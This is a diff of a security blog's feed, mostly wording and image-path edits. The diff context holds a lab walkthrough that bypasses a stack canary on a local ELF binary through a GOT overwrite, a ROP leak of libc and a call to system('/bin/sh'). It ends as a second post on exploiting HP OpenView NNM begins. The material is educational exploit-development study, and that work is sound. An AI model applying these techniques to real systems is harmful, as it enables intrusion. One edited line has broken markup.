+<h2>High-Level Analysis</h2>
 
 <ol>
 <li>It is a <code>64</code> bit <code>ELF</code> binary.</li>
 <li><code>.GOT</code> is <code>readable</code> and <code>writable</code>. <code>.GOT</code> is stored in the <code>data</code> segment(<code>RW</code>) section.</li>
 <li><code>Stack</code> memory is not <code>executable</code>.</li>
-<li>A <code>canary</code> is used to detect stack smashing attack. On every program restart, this <code>8</code> bytes random value will change.</li>
-<li>It is a <code>non_pie</code> binary and <code>ASLR</code> is activated in the OS level. So the data segment is  <code>randomised</code> on every program restart and we can&rsquo;t hardcode any of those addresses in our payload. However, the binary will be always loaded at a <code>fixed</code> address.</li>
+<li>A <code>canary</code> is used to detect a stack smashing attack. On every program restart, this <code>8</code> bytes random value changes.</li>
+<li>It is a <code>non_pie</code> binary and <code>ASLR</code> is activated at the OS level. So the data segment is <code>randomized</code> on every program restart and we can&rsquo;t hardcode any of those addresses in our payload. However, the binary is always gets loaded at a <code>fixed</code> address.</li>
 </ol>
 
 
 <h2>Code Review</h2>
 
 <ol>
-<li><p>Variable <code>c</code> type <code>structure</code>, tag <code>contact</code> is declared in <code>main()</code>. So it will be stored on the stack. The block size of <code>64</code> bit system is <code>8</code> bytes. So the total size of the structure is <code>32</code> bytes.</p>
+<li><p>Variable <code>c</code> type <code>structure</code>, tag <code>contact</code> is declared in <code>main()</code>. So it gets stored on the stack. The block size of the <code>64</code> bit system is <code>8</code> bytes. So the total size of the structure is <code>32</code> bytes.</p>
 
 <ol>
 <li><code>name</code> = 24 bytes (originally allocated 20 bytes in code but gcc compiler allocates bytes multiple of 8)</li>
@@ -2348,7 +2347,7 @@
 </li>
 <li><p><code>setup()</code> function is used just to <code>flush</code> out the buffer.</p></li>
 <li><p><code>memset()</code> function is used to <code>zero out</code> the structure variables.</p></li>
-<li><p><code>scanf()</code> reads from the <code>stdin</code> based on the format specifier. Here the format specifier is <code>%s</code> so it will read the input as <code>string</code> untill we press <code>ENTER</code> or provide <code>\n</code> , then it stores that entire value into the variables (i.e <code>c.name</code> and <code>c.description</code>) and adds a <code>null</code> byte or <code>\0</code> at the end.</p></li>
+<li><p><code>scanf()</code> reads from the <code>stdin</code> based on the format specifier. Here the format specifier is <code>%s</code> so it reads the input as <code>string</code> until we press <code>ENTER</code> or provide <code>\n</code>, then it stores that entire value into the variables (i.e. <code>c.name</code> and <code>c.description</code>) and adds a <code>null</code> byte or <code>\0</code> at the end.</p></li>
 <li><p><code>c.description</code> variable holds an address that points to a <code>heap</code> region.</p></li>
 </ol>
 
@@ -2371,8 +2370,8 @@
 <h4>Bug 2</h4>
 
 <ul>
-<li>Similarly, while providing the input through <code>description</code> variable, we can write something where <code>heap pointer</code> points and can potentially overflow the heap memory if we provide the input more than <code>100</code> bytes.</li>
-<li>If we chain those bugs together, then while giving input through <code>name</code> variable, we can overwrite the <code>heap_pointer</code> address then providing input through <code>description</code> variable, we can write something where the <code>heap_pointer</code> points.</li>
+<li>Similarly, while providing the input through the <code>description</code> variable, we can write something where <code>heap pointer</code> points and can overflow the heap memory if we provide the input more than <code>100</code> bytes.</li>
+<li>If we chain those bugs together, then while giving input through the <code>name</code> variable, we can overwrite the <code>heap_pointer</code> address then providing input through the <code>description</code> variable, we can write something where the <code>heap_pointer</code> points.</li>
 </ul>
 
 
@@ -2386,7 +2385,7 @@
 </span><span class='line'>objdump -d -M intel vuln</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190711220750599.png" alt="image-20190711220750599.png" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190711220750599.png" alt="image-20190711220750599.png" /></p>
 
 <h2>Dynamic Analysis</h2>
 
@@ -2597,29 +2596,29 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>This script sends <code>A</code> and <code>B</code> buffer through <code>name</code> and <code>description</code> variable.</p>
+<p>This script sends <code>A</code> and <code>B</code> buffer through the <code>name</code> and <code>description</code> variable.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727081724587.png" alt="image-20190727081724587" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727081724587.png" alt="image-20190727081724587" /></p>
 
 <p>Program halts on the first <code>scanf()</code>.</p>
 
-<blockquote><p><strong>[DEBUG] sent <code>0x18</code> bytes:</strong> <em>This means the input is sent from the exploit code but it is not yet received by the program.</em></p></blockquote>
+<blockquote><p><strong>[DEBUG] sent <code>0x18</code> bytes:</strong> <em>This means the input is sent from the exploit code, but the program does not yet receive it.</em></p></blockquote>
 
-<p>Observe the <code>backtrace</code>, at this point the execution is not in the <code>main()</code> stack frame.</p>
+<p>Observe the <code>backtrace</code>, at this point, the execution is not in the <code>main()</code> stack frame.</p>
 
 <p>Jump to the <code>main()</code> frame by entering the <code>finish</code> command multiple times.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727081853690.png" alt="image-20190727081853690" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727081853690.png" alt="image-20190727081853690" /></p>
 
-<p>From our static analysis, we know that <code>name</code> buffer starts from the <code>RSP + 0</code> offset and <code>heap_pointer</code> will be at <code>RSP + 24</code>.</p>
+<p>From our static analysis, we know that <code>name</code> buffer starts from the <code>RSP + 0</code> offset and <code>heap_pointer</code> gets stored at <code>RSP + 24</code>.</p>
 
-<p>Verify this hypothesis by analysing the memory stack.</p>
+<p>Verify this hypothesis by analyzing the memory stack.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>x/20gx $rsp</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727082108421.png" alt="image-20190727082108421" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727082108421.png" alt="image-20190727082108421" /></p>
 
 <p>Exit from the program -> <code>continue</code> or <code>c</code>, <code>quit</code> then <code>ctrl + c</code>.</p>
 
@@ -2643,17 +2642,17 @@
 
 <ul>
 <li>Found the <code>A</code> buffer starting at <code>0x7fffd9ce76b0</code>.</li>
-<li>As we have not stepped through the program and executed the second <code>scanf</code>, so we have some <code>heap_pointer</code> value <code>0x0000000001be2010</code>. This address is from <code>heap</code> section.</li>
-<li>I was expecting <code>canary</code> after <code>heap_pointer</code>.  But another address - <code>0x00007fffd9ce77c0</code> is stored there. It could be due to compiler optimisation.</li>
-<li>However, found canary = <code>0xf9f40452491f4300</code> after that. As expected the <code>canary</code> starts with <code>00</code> byte signature.</li>
+<li>As we have not stepped through the program and executed the second <code>scanf</code>, so we have some <code>heap_pointer</code> value <code>0x0000000001be2010</code>. This address is from the <code>heap</code> section.</li>
+<li>I was expecting <code>canary</code> after <code>heap_pointer</code>.  But another address - <code>0x00007fffd9ce77c0</code> is stored there. It could be due to compiler optimization.</li>
+<li>However, found canary = <code>0xf9f40452491f4300</code> after that. As expected, the <code>canary</code> starts with <code>00</code> byte signature.</li>
 </ul>
 
 
 <p>Get an idea of the <code>libc</code> address range from <code>vmmap</code> command.</p>
 
-<p>Found <code>0x7f9ccc</code> is the starting pattern for <code>libc</code> address. (mapping address of <code>.so</code> files.</p>
+<p>Found <code>0x7f9ccc</code> is the starting pattern for the <code>libc</code> address. (mapping address of <code>.so</code> files.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727082942062.png" alt="image-20190727082942062" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727082942062.png" alt="image-20190727082942062" /></p>
 
 <p>Found an <code>libc</code> address in the <code>RSP + 7</code> offset => <code>0x00007f9ccce51830</code>.</p>
 
@@ -2665,14 +2664,14 @@
 </span><span class='line'>0x7f9ccce51830 (__libc_start_main+240) ◂— mov    edi, eax</span></code></pre></td></tr></table></div></figure>
 
 
-<p>For every program restart, this <code>libc</code> address will be <code>changed</code> but the <code>offset</code> from <code>RSP</code> will remain the same.</p>
+<p>For every program restart, this <code>libc</code> address changes but the <code>offset</code> from <code>RSP</code> remains the same.</p>
 
 <h2>Strategy to Exploit</h2>
 
 <ol>
-<li>We can&rsquo;t <code>leak</code> the <code>canary</code> value because there is no <code>puts</code> (like <code>printf</code>) after the last <code>scanf</code>.</li>
-<li>However, while proving the input to <code>name</code> variable, we can overwrite the <code>heap_pointer</code> with an <code>address</code>.</li>
-<li>Again, while providing the input to  <code>description</code> variable, we can provide an <code>address</code> and this <code>address</code> will be written to the memory location where <code>heap_pointer</code> points.</li>
+<li>We can&rsquo;t <code>leak</code> the <code>canary</code> value because there are no <code>puts</code> (like <code>printf</code>) after the last <code>scanf</code>.</li>
+<li>However, while proving the input to the <code>name</code> variable, we can overwrite the <code>heap_pointer</code> with an <code>address</code>.</li>
+<li>Again, while providing the input to the <code>description</code> variable, we can provide an <code>address</code> and this <code>address</code> gets overwritten to the memory location where <code>heap_pointer</code> points.</li>
 <li>We know that the binary is <code>partial relro</code> so we can overwrite the <code>.GOT</code>.</li>
 </ol>
 
@@ -2689,17 +2688,17 @@
 
 <p>Open the binary in <code>IDA</code> -> click on <code>main()</code> function, click on <code>IDA_View</code> then <code>right click</code> -> <code>graph_view</code> to understand the code.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190730192512070.png" alt="image-20190730192512070" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190730192512070.png" alt="image-20190730192512070" /></p>
 
-<p>If the canary does not match then the program calls the <code>__stack_chk_fail</code> function and this is a <code>libc</code> function.</p>
+<p>If the canary does not match, the program calls the <code>__stack_chk_fail</code> function, which is a <code>libc</code> function.</p>
 
-<p>When we double click on that <code>__stack_chk_fail</code>. Then it will go to the <code>.PLT</code>.</p>
+<p>When we double click on that <code>__stack_chk_fail</code>. Then it goes to the <code>.PLT</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190730193205137.png" alt="image-20190730193205137.png" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190730193205137.png" alt="image-20190730193205137.png" /></p>
 
-<p>Double click again then it will go to <code>.GOT</code>.</p>
+<p>Double click again, then it goes to <code>.GOT</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190730193457543.png" alt="image-20190730193457543" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190730193457543.png" alt="image-20190730193457543" /></p>
 
 <p>In nutshell, whenever <code>__stack_chk_fail</code> is called then finally it goes to <code>.GOT</code> via <code>.PLT</code> and put the <code>value</code>(basically a libc address) stored into address(<code>0x0000000000601020</code>) inside <code>RIP</code>.</p>
 
@@ -2712,15 +2711,15 @@
 <p><strong><code>WHERE</code> to write</strong></p>
 
 <ul>
-<li>While providing the input into <code>name</code> variable, we can overwrite the <code>heap_pointer</code> value with <code>0000000000601020</code>.</li>
-<li>Also we need to send <code>48</code> bytes buffer to corrupt the <code>canary</code> stored on the stack so that it <code>triggers</code> the <code>__stack_chk_fail</code> function at the end.</li>
+<li>While providing the input into the <code>name</code> variable, we can overwrite the <code>heap_pointer</code> value with <code>0000000000601020</code>.</li>
+<li>Also, we need to send <code>48</code> bytes buffer to corrupt the <code>canary</code> stored on the stack so that it <code>triggers</code> the <code>__stack_chk_fail</code> function at the end.</li>
 </ul>
 
 
 <p><strong><code>WHAT</code> to write</strong></p>
 
 <ul>
-<li>While providing input to <code>description</code> variable, we can feed <code>deadbeef</code>.</li>
+<li>While providing input to the <code>description</code> variable, we can feed <code>deadbeef</code>.</li>
 <li>Objective is to set <code>RIP</code> = <code>deadbeef</code> if we continue to execute the program.</li>
 <li>Later we can update this <code>deadbeef</code> with <code>ROP</code> gadgets to invoke <code>system()</code>.</li>
 </ul>
@@ -2745,12 +2744,12 @@
 <span class='line-number'>3</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'># .GOT table structure
 </span><span class='line'>0x0000000000601018: puts() function pointer's address (in libc) =&gt; 8 bytes
-</span><span class='line'>0x0000000000601020:   __stack_chk_fail() function pointer's address (in libc) =&gt; (0x0000000000601020 - 0x0000000000601018) = 8 bytes</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>0x0000000000601020:    __stack_chk_fail() function pointer's address (in libc) =&gt; (0x0000000000601020 - 0x0000000000601018) = 8 bytes</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Due to <code>ASLR</code> and <code>partial relro</code>, the value (basically a <code>libc</code> address) stored on those <code>GOT</code> addresses(i.e <code>0x0000000000601018</code>) will be changed on every program restart.</p>
 
-<p>However, this binary is <code>non pie</code> and the program <code>load address</code> address in not <code>randomise</code>. This means all addresses in the program such as <code>0x0000000000601018</code> are fixed.</p>
+<p>However, this binary is <code>non-pie</code>, and the program&rsquo;s load address<code>address' is not</code>randomize<code>which indicates that all addresses in the program such as</code>0x0000000000601018<code>are</code>fixed`.</p>
 
 <p>Lets observe what values are stored on <code>0x0000000000601018</code> and <code>0x0000000000601020</code>.</p>
 
@@ -2758,7 +2757,7 @@
 </pre></td><td class='code'><pre><code class=''><span class='line'>telescope 0x0000000000601018</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727084310718.png" alt="image-20190727084310718" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727084310718.png" alt="image-20190727084310718" /></p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -2993,7 +2992,7 @@
 </span><span class='line'>pwndbg&gt; b *0x0000000000400859</span></code></pre></td></tr></table></div></figure>
 
 
-<p>When we hit this break point,<code>.GOT</code> will not have the <code>__stack_chk_fail()</code> libc address as it is calling first time so it is not loaded yet.</p>
+<p>When we hit this breakpoint,<code>.GOT</code> does not have the <code>__stack_chk_fail()</code> libc address as it is calling the first time, so it is not loaded yet.</p>
 
 <p>set another breakpoint at <code>__stack_chk_fail</code> function.</p>
 
@@ -3001,17 +3000,17 @@
 </pre></td><td class='code'><pre><code class=''><span class='line'>break __stack_chk_fail</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727085847861.png" alt="image-20190727085847861" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727085847861.png" alt="image-20190727085847861" /></p>
 
 <p>Now when we <code>continue</code> the program and hit our first breakpoint, we can notice <code>__stack_chk_fail()</code> libc address is not loaded in <code>.GOT</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727091100273.png" alt="image-20190727091100273" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727091100273.png" alt="image-20190727091100273" /></p>
 
 <p>Now when we <code>continue</code> again, then the execution goes to <code>__stack_chk_fail.plt</code> then <code>plt_common_stub</code> to <code>dll_runtime_resolv_avx</code> to resolve the address.</p>
 
-<p>Finally, execution stops when it is about to call <code>__stack_chk_fail</code>. At this point, we can notice <code>__stack_chk_fail</code>  <code>.GOT</code> address is loaded.</p>
+<p>Finally, execution stops when it is about to call <code>__stack_chk_fail</code>. At this point, we can notice <code>__stack_chk_fail</code>  <code>.GOT's</code> address is loaded.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727091220702.png" alt="image-20190727091220702" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727091220702.png" alt="image-20190727091220702" /></p>
 
 <h2>Analyse the <code>.GOT</code> of <code>puts()</code></h2>
 
@@ -3047,9 +3046,9 @@
 
 <h2>Control <code>RIP</code></h2>
 
-<p>Due to <code>ASLR</code> these libc addresses are <code>randomised</code> on every program <code>restart</code>.</p>
+<p>Due to <code>ASLR</code> these libc addresses are <code>randomized</code> on every program <code>restart</code>.</p>
 
-<p>However, the interesting point is, <code>ASLR</code> protection randomise only <code>4</code> bytes.</p>
+<p>However, the interesting point is, <code>ASLR</code> protection randomize only <code>4</code> bytes.</p>
 
 <p>Starting <code>1.5</code> bytes and last <code>2.5</code> bytes are <code>constant</code> / fixed.</p>
 
@@ -3061,11 +3060,11 @@
 
 <p><code>0x000000000060101f</code> => this does not have any bad char.</p>
 
-<p>Also while providing the input through <code>description</code> variable we can first fix this overwritten value with <code>\x00</code> then provide <code>0xdeadbeef</code>.</p>
+<p>Also, while providing the input through the <code>description</code> variable, we can fix this overwritten value with <code>\x00</code> and provide <code>0xdeadbeef</code>.</p>
 
 <p>In little endian format => <code>0xdeadbeef00</code>.</p>
 
-<p>As a result, it makes the <code>puts()</code> <code>GOT</code> entry same as before and also changes the <code>__stack_chk_fail</code> <code>GOT</code> entry to <code>0xdeadbeef</code>.</p>
+<p>As a result, it makes the <code>puts()</code> <code>GOT</code> entry the same as before and also changed the <code>__stack_chk_fail</code> <code>GOT</code> entry to <code>0xdeadbeef</code>.</p>
 
 <p>Execute <code>exploit_v03.py</code> and observe <code>RIP</code> = <code>0xdeadbeef</code></p>
 
@@ -3290,22 +3289,22 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727092631751.png" alt="image-20190727092631751" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727092631751.png" alt="image-20190727092631751" /></p>
 
 <h2>ROP Gadget</h2>
 
 <p>During this <code>crash</code>, <code>RSP</code> points just before our <code>input</code> buffer.</p>
 
-<p>If we would like to get full control of the stack then we need to organise the stack in such a way so that</p>
+<p>If we would like to get full control of the stack, then we need to organize the stack in such a way so that.</p>
 
 <ul>
-<li><code>RSP</code> should point below <code>0x7ffc50cc51a0</code>. Otherwise we will be limited to initial <code>24</code> bytes as the <code>heap_pointer</code> value is <code>fixed</code>.</li>
+<li><code>RSP</code> should point below <code>0x7ffc50cc51a0</code>. Otherwise, we limit ourselves to the initial <code>24</code> bytes as the <code>heap_pointer</code> value is <code>fixed</code>.</li>
 <li><code>RSP - 8</code> should point to an address of another ROP chain.</li>
 <li><code>RSP</code> should have the value that we want to set in the register (argument of a function)</li>
 </ul>
 
 
-<p>It means we need to find a <code>ROP gadget</code> that will make <code>RSP</code> points to <code>0x7ffc50cc51b0</code>.</p>
+<p>It means we need to find an <code>ROP gadget</code> that makes <code>RSP</code> points to <code>0x7ffc50cc51b0</code>.</p>
 
 <p>Replace <code>0xdeadbeef</code> with (5 <code>POP</code> + <code>RETN</code>) gadget <code>address</code>.</p>
 
@@ -3590,19 +3589,19 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727094227738.png" alt="image-20190727094227738" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727094227738.png" alt="image-20190727094227738" /></p>
 
 <h2>Leak libs - <code>malloc()</code> address</h2>
 
 <p>Now our goal is to leak any libc address and find the offset from <code>system()</code>.</p>
 
-<p><code>puts()</code> is used in our the program code. So we can leak any libc address by invoking / calling <code>puts()</code> function.</p>
+<p><code>puts()</code> is used in our program code. So we can leak any libc address by invoking/calling <code>puts()</code> function.</p>
 
 <p>There are two ways,</p>
 
 <ol>
 <li>Through it&rsquo;s <code>.PLT</code>. This address is stored in the code section. So this address is fixed (permission <code>RX</code>).</li>
-<li>Through it&rsquo;s <code>.GOT</code>. This address is stored in the data section for <code>partial_relro</code> binary. (permission <code>RW</code>)</li>
+<li>Through it&rsquo;s <code>.GOT</code>. This address is stored in the data section for the <code>partial_relro</code> binary. (permission <code>RW</code>)</li>
 </ol>
 
 
@@ -3610,7 +3609,7 @@
 
 <p>From IDA graph view, click on any <code>puts()</code> function, it goes to its <code>.PLT</code>, right click => <code>text view</code> =  <code>0000000000400610</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190730195502394.png" alt="image-20190730195502394" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190730195502394.png" alt="image-20190730195502394" /></p>
 
 <h2>Argument of <code>puts()</code></h2>
 
@@ -3618,7 +3617,7 @@
 
 <p>All <code>libc</code> addresses are loaded in <code>GOT</code> during run time. So if we need the <code>malloc()</code> libc address then we need to pass it&rsquo;s <code>GOT</code> address - <code>0000000000601030</code> as an argument to <code>puts()</code> function.</p>
 
-<p><code>puts()</code> will try to print all values stored from that address until it gets a <code>null</code>.</p>
+<p><code>puts()</code> tries to print all values stored from that address until it gets <code>null</code>.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>got.plt:0000000000601030 off_601030      dq offset malloc        ; DATA XREF: _malloc</span></code></pre></td></tr></table></div></figure>
@@ -3887,25 +3886,26 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Set a breakpoint on that address - <code>0x00000000004008bb</code> and <code>continue</code> to hit the breakpoint then single step through (<code>si</code>) the program.</p>
+<p>Set a breakpoint on that address - <code>0x00000000004008bb</code> and <code>continue</code> to hit the breakpoint then single-step through (<code>si</code>) the program.</p>
 
 <p>After we finish <code>5 POP + RETN</code>, <code>RSP</code> points to the overwritten <code>canary</code> => <code>0000000000601030</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727120236240.png" alt="image-20190727120236240" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727120236240.png" alt="image-20190727120236240" /></p>
 
 <p>After we finish <code>POP RDI, RETN</code>, <code>RSP</code> will point to overwritten <code>EBP</code> / <code>0xdeadbeef</code> and the program is about to execute <code>puts()</code> <code>.PLT</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727120545693.png" alt="image-20190727120545693" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727120545693.png" alt="image-20190727120545693" /></p>
 
 <p>If we <code>continue</code> then <code>puts()</code> prints the <code>malloc()</code> libc address and <code>RIP</code> = <code>0xdeadbeef</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727121324645.png" alt="image-20190727121324645" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727121324645.png" alt="image-20190727121324645" /></p>
 
 <h2><code>system()</code> offset</h2>
 
-<p>From this <code>libc_leak</code>, we need to find the offset of <code>system()</code> address and <code>/bin/sh</code> address. This is <code>fixed</code> across ever run for a particular <code>libc</code> only. Even different kernel versions but same libc will have same offset.</p>
+<p>From this <code>libc_leak</code>, we need to find the offset of <code>system()</code> address and <code>/bin/sh</code> address. Those addresses are <code>fixed</code> across every run for that <code>libc</code>.
+For a different kernel, that libc address changes, but the offset remains the same.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727122050900.png" alt="image-20190727122050900" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727122050900.png" alt="image-20190727122050900" /></p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -3929,17 +3929,17 @@
 
 <h2>Jump back to <code>main()</code></h2>
 
-<p>However, if we jump back to <code>main()</code> then again we can control our input.</p>
+<p>However, if we jump back to <code>main()</code>, then again, we can control our input.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>pwndbg&gt; print main =&gt; 0x00000000004007b8</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727150248410.png" alt="image-20190727150248410" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727150248410.png" alt="image-20190727150248410" /></p>
 
 <p>Replace <code>0xdeadbeef</code> with the address of <code>main()</code>.</p>
 
-<p>We need to take control of the <code>RIP</code> again through <code>canary</code> corruption but this time, during stack step up, we call <code>system('\bin\sh')</code> instead of calling <code>puts()</code>.</p>
+<p>We need to take control of the <code>RIP</code> again through <code>canary</code> corruption, but this time, during stack step up, we call <code>system('\bin\sh')</code> instead of calling <code>puts()</code>.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v06.py -m true local -b vuln -g true</span></code></pre></td></tr></table></div></figure>
@@ -3949,7 +3949,7 @@
 
 <p>Move to <code>tmux</code> left panel => <code>ctl + b</code> + <code>left arrow key</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727160056643.png" alt="image-20190727160056643" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727160056643.png" alt="image-20190727160056643" /></p>
 
 <h2>The Shell</h2>
 
@@ -4232,7 +4232,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/canary_bypass/image-20190727160539468.png" alt="image-20190727160539468" /></p>
+<p><img src="http://greyshell.github.io/artifacts/canary_bypass02.assets/image-20190727160539468.png" alt="image-20190727160539468" /></p>
 
 <h2>Conclusion</h2>
 
@@ -4279,17 +4279,15 @@
 </span><span class='line'>    NX:       NX enabled
 </span><span class='line'>    PIE:      PIE enabled</span></code></pre></td></tr></table></div></figure>
 
-
-
 ]]></content>
   </entry>
   
   <entry>
     <title type="html"><![CDATA[Exploiting HP OpenView NNM - B.07.53]]></title>
-    <link href="http://greyshell.github.io/blog/2016/11/07/hpnmm-exploit/"/>
+    <link href="http://greyshell.github.io/blog/2016/11/07/hpnmm-B.07.53-exploit/"/>
     <updated>2016-11-07T18:23:51-08:00</updated>
-    <id>http://greyshell.github.io/blog/2016/11/07/hpnmm-exploit</id>
-    <content type="html"><![CDATA[<p>In <a href="https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Aharoni">DEFCON #16</a>, there was an interesting session on <code>HP OpenView NNM</code>  exploitation - <strong><em>&ldquo;from bug to 0 day&rdquo;</em></strong> presented by <em>muts</em>. While watching his walkthrough, I found that particular exploit development process was extremely intense and challenging. To better understand the concepts, I decided to take that as an exercise and try to reproduce the same in my local environment.</p>
+    <id>http://greyshell.github.io/blog/2016/11/07/hpnmm-B.07.53-exploit</id>
+    <content type="html"><![CDATA[<p>In <a href="https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Aharoni">DEFCON #16</a>, there was an interesting session on <code>HP OpenView NNM</code> exploitation <strong><em>&ldquo;from bug to 0 day&rdquo;</em></strong> presented by <em>muts</em>. While watching his walk-through, I found that this particular exploit development process was extremely intense and challenging. To better understand the concepts, I decided to take that as an <strong>exercise</strong> and try to reproduce the same in my local environment.</p>
 
 <!-- more -->
 
@@ -4301,7 +4299,7 @@
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>- 32 bit windows server 2003-R2-SP2 (disabled DEP, enabled ASLR)
+</pre></td><td class='code'><pre><code class=''><span class='line'>- 32-bit windows server 2003-R2-SP2 (disabled DEP, enabled ASLR)
 </span><span class='line'>- python 2.7 x86, pydbg 32-bit binary, python wmi, pywin32
 </span><span class='line'>- HP OpenView NNM release - B.07.53
 </span><span class='line'>- Immunity Debugger v1.85, mona.py v2.0
@@ -4310,19 +4308,19 @@
 
 <h2>Web Interface</h2>
 
-<p>Install HP OpenView NNM (release - <code>B.07.53</code>) on <code>Windows 2003-R2-SP2</code>.</p>
+<p>Install HP <code>OpenView NNM</code> (release - <code>B.07.53</code>) on <code>Windows 2003-R2-SP2</code>.</p>
 
 <p>Browse it’s web interface  - <code>http://172.16.232.198:7510/topology/home</code> to verify everything is up and running.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/hpnnm_version.png" alt="hpnnm_version" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/hpnnm_version.png" alt="hpnnm_version" /></p>
 
 <h2>Fuzz Variables</h2>
 
-<p>Sniff the <code>HTTP</code> traffic through <code>Burp</code> proxy and identify <code>5</code> potential fuzz points (HTTP method, url_path, ip_address, port, user_agent header) on that  <code>GET</code> request.</p>
+<p>Sniff the <code>HTTP</code> traffic through <code>Burp</code> proxy and identify <code>5</code> potential fuzz points (HTTP method, url_path, ip_address, port, user_agent header) on that <code>GET</code> request.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/http_sniff.png" alt="http-sniff" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/http_sniff.png" alt="http-sniff" /></p>
 
-<p>In order to crash the application, create a <code>Spike</code> template - <code>http.spk</code>.</p>
+<p>To crash the application, create a <code>Spike</code> template - <code>http.spk</code>.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -4364,9 +4362,9 @@
 
 <h2>Process - <code>ova.exe</code></h2>
 
-<p>It is observed that <code>ova.exe</code> process is responsible for listening the network connection on <code>TCP</code> port <code>7150</code>.</p>
